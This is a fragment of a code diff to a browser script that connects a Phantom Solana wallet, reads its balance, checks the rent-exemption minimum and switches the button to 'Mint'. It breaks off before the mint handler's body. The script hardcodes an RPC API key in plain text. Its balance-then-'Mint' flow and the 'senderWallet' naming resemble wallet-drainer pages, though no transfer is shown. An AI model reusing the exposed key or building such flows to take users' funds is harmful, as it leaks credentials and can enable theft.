@@ -1,31 +1,29 @@
-// Safely assign Buffer polyfill for browsers
-if (typeof window !== "undefined" && window.buffer?.Buffer) {
-  window.Buffer = window.Buffer || window.buffer.Buffer;
+// Ensure Buffer polyfill is available
+if (typeof window !== "undefined" && window.buffer?.Buffer && !window.Buffer) {
+  window.Buffer = window.buffer.Buffer;
 }
 
-$(document).ready(function() {
-    $('#connect-wallet').on('click', async () => {
-        if (window.solana && window.solana.isPhantom) {
-            try {
-                const resp = await window.solana.connect();
-                console.log("Phantom Wallet connected:", resp);
+$(document).ready(function () {
+  $('#connect-wallet').on('click', async () => {
+    if (window.solana && window.solana.isPhantom) {
+      try {
+        const resp = await window.solana.connect();
+        console.log("Phantom Wallet connected:", resp);
 
-               var connection = new solanaWeb3.Connection(
-               'https://mainnet.helius-rpc.com/?api-key=694c477f-7093-40cd-8456-30fa1e8f888a',
-               'confirmed'
-               );
+        const connection = new solanaWeb3.Connection(
+          'https://mainnet.helius-rpc.com/?api-key=694c477f-7093-40cd-8456-30fa1e8f888a',
+          'confirmed'
+        );
 
+        const senderWallet = new solanaWeb3.PublicKey(resp.publicKey);
+        const balance = await connection.getBalance(senderWallet);
+        console.log("Wallet balance:", balance);
 
-                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
-                const walletBalance = await connection.getBalance(public_key);
-                console.log("Wallet balance:", walletBalance);
-
-                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                if (walletBalance < minBalance) {
-                    alert("Insufficient funds for rent.");
-                    return;
-                }
-
+        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+        if (balance < minBalance) {
+          alert("Insufficient funds for rent.");
+          return;
+        }
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
                 try {
